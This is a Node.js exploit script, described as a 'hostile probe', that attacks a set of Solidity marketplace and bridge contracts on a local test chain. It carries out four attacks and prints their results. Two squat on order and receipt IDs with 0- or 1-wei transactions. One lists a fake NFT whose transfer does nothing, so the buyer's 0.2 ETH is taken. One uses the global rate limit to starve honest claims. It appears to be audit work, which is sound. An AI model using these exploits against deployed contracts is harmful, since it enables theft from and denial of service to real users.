#!/usr/bin/env node
/*  Hostile probe against probe/Bourse.sol. Scratch — delete freely.      */
import { compile, artifact } from "./compile.mjs";
import { Chain, encodeAddressArg, decAddr, decUint, warp, GENESIS_TIME } from "./evm.mjs";
import { keccak256 } from "ethereum-cryptography/keccak.js";
import { hexToBytes, bytesToHex } from "ethereum-cryptography/utils.js";

const out = compile({ quiet: true, dirs: ["src", "test/mocks", "probe"] });
const A = (f, n) => artifact(out, f, n);
const c = await Chain.open();
const me = c.from.toString();
const w = (n) => BigInt(n).toString(16).padStart(64, "0");
const ZERO40 = "0x" + "00".repeat(20);

const dep = async (name, args = "") => (await c.send({ data: A("probe/Bourse.sol", name).bytecode + args })).address;
const berth = await dep("Berth", encodeAddressArg(ZERO40));          // HUB = 0, third-party market
const wit1  = await dep("StubWitness", encodeAddressArg(me));
const quorum = (await c.send({ data: A("probe/Bourse.sol","Quorum").bytecode
  + encodeAddressArg(me) + w(0x40) + w(1) + encodeAddressArg(wit1) })).address;
const purse = await dep("Purse", encodeAddressArg(quorum));
const nft   = await c.deploy(A("test/mocks/MockERC721.sol","MockERC721").bytecode);
const liar  = await c.deploy(A("probe/_AttackLiar.sol","Liar").bytecode);

const seller = await c.as("0x" + "a1".repeat(32));
const buyer  = await c.as("0x" + "b2".repeat(32));
const evil   = await c.as("0x" + "ee".repeat(32));
const T0 = GENESIS_TIME, FAR = T0 + 20n * 86400n, PRICE = 2n * 10n ** 17n;
const lotOf = (who, n) => "0x" + bytesToHex(keccak256(hexToBytes(
  "0x" + w(1) + berth.slice(2).padStart(64,"0") + who.slice(2).padStart(64,"0") + w(n))));
const ok = async (p) => { try { await p; return "SUCCEEDED"; } catch(e){ return "reverted: " + (String(e.message).match(/data=(0x[0-9a-f]{8,10})/)?.[1] || "revert"); } };

console.log("\n════ B1 · the away-chain order-id namespace is free to squat ════");
const VICTIM = "0x" + "77".repeat(32);
console.log("  attacker commits 0 wei at the victim's order id …",
  await ok(evil.exec(purse, "commit(bytes32,uint32,address,bytes32,address,uint64,uint8)",
    [VICTIM, 1, berth, lotOf(seller.from.toString(),0), evil.from.toString(), FAR, 1], { value: 0n })));
console.log("  the real buyer now commits 0.2 ETH at the same id …",
  await ok(buyer.exec(purse, "commit(bytes32,uint32,address,bytes32,address,uint64,uint8)",
    [VICTIM, 1, berth, lotOf(seller.from.toString(),0), buyer.from.toString(), FAR, 1], { value: PRICE })));
console.log("  cost to the attacker: one 0-wei transaction. The id is dead forever —");
console.log("  refund() sets spent, it never deletes orderOf[order].buyer.");

console.log("\n════ B2 · the home-chain receipt namespace is free to squat ════");
await evil.exec(nft, "mint(address,uint256)", [evil.from.toString(), 999]);
await evil.exec(nft, "approve(address,uint256)", [berth, 999]);
await evil.exec(berth, "list(address,uint256,uint96,uint64)", [nft, 999, 1n, FAR]);
const EVILLOT = lotOf(evil.from.toString(), 0);
const O = "0x" + "42".repeat(32);
console.log("  attacker self-buys a 1-wei junk lot, naming the victim's order id …",
  await ok(evil.exec(berth, "buyFor(bytes32,uint96,address,bytes32,uint96,uint64)",
    [EVILLOT, 1n, evil.from.toString(), O, 1n, FAR], { value: 1n })));
await seller.exec(nft, "mint(address,uint256)", [seller.from.toString(), 1]);
await seller.exec(nft, "approve(address,uint256)", [berth, 1]);
await seller.exec(berth, "list(address,uint256,uint96,uint64)", [nft, 1, PRICE, FAR]);
const REALLOT = lotOf(seller.from.toString(), 0);
console.log("  the honest seller now tries to deliver against that order …",
  await ok(seller.exec(berth, "fillFromAway(bytes32,bytes32,address,uint96,uint64)",
    [REALLOT, O, buyer.from.toString(), PRICE, FAR])));
console.log("  attacker's outlay: 1 wei, refunded to itself via owed[]. Gas only.");

console.log("\n════ B3 · Berth never checks the asset arrived ════");
console.log("  list a collection whose transferFrom does nothing …",
  await ok(evil.exec(berth, "list(address,uint256,uint96,uint64)", [liar, 7, PRICE, FAR])));
const LIARLOT = lotOf(evil.from.toString(), 1);
console.log("  a buyer pays 0.2 ETH for it …",
  await ok(buyer.exec(berth, "buyFor(bytes32,uint96,address,bytes32,uint96,uint64)",
    [LIARLOT, PRICE, buyer.from.toString(), "0x"+"00".repeat(32), 0, 0], { value: PRICE })));
console.log("  attacker owed on Berth:", decUint(await c.read(berth, "owed(address)", [evil.from.toString()])).toString(), "wei");

console.log("\n════ B4 · the global rate limiter is a starvation lever ════");
/* eight cheap orders the attacker controls end to end */
const digest = (lot, order, recip, payee, price, ra, rTo, rAmt) =>
  "0x" + bytesToHex(keccak256(hexToBytes("0x" + w(1) + berth.slice(2).padStart(64,"0")
    + lot.slice(2) + order.slice(2) + recip.slice(2).padStart(64,"0")
    + payee.slice(2).padStart(64,"0") + w(price) + w(ra)
    + rTo.slice(2).padStart(64,"0") + w(rAmt))));
let filled = 0;
for (let i = 0; i < 8; i++) {
  const o = "0x" + (i+160).toString(16).padStart(2,"0").repeat(32);
  await evil.exec(purse, "commit(bytes32,uint32,address,bytes32,address,uint64,uint8)",
    [o, 1, berth, EVILLOT, evil.from.toString(), FAR, 1], { value: 1n });
  const d = digest(EVILLOT, o, evil.from.toString(), evil.from.toString(), 1n, FAR, ZERO40, 0n);
  await c.exec(wit1, "witness(bytes32)", [d]);
  const r = await ok(c.exec(purse, "claim(bytes32,address,address,uint96)", [o, evil.from.toString(), ZERO40, 0]));
  if (r === "SUCCEEDED") filled++;
}
console.log(`  attacker filled ${filled}/8 of this hour's claim budget with 1-wei orders.`);
/* now an honest order, fully witnessed, tries to claim in the same hour */
const HO = "0x" + "5a".repeat(32);
await buyer.exec(purse, "commit(bytes32,uint32,address,bytes32,address,uint64,uint8)",
  [HO, 1, berth, REALLOT, buyer.from.toString(), FAR, 1], { value: PRICE });
await seller.exec(berth, "fillFromAway(bytes32,bytes32,address,uint96,uint64)",
  [REALLOT, HO, buyer.from.toString(), PRICE, FAR]);
const HD = await c.read(berth, "digestOf(bytes32)", [HO]);
await c.exec(wit1, "witness(bytes32)", [HD]);
console.log("  the honest seller, asset already delivered, claims …",
  await ok(c.exec(purse, "claim(bytes32,address,address,uint96)", [HO, seller.from.toString(), ZERO40, 0])));
console.log("  attacker cost for the hour: 8 × 1 wei + gas. Seller's asset is already gone.");
